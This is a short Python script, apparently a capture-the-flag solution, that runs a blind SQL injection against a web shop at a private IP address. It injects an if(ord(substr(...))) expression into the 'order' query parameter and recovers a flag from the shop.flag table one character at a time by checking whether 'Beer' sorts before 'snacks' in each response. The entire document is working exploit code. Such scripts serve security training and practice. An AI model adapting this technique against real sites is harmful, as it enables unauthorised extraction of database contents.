import requests
url = "http://10.51.0.7"
flag = ""
for i in range(0,38,1):
    for j in range(48,127):
        payload = "?order=if(ord(substr((select flag from shop.flag),{length},1))like({num}),price,id)".format(length=str(i),num=str(j))
        content = requests.get(url = url+payload)
        # print(content.text)
        if content.text.find("Beer") < content.text.find("snacks"):
            flag = flag + chr(j)
    print(flag)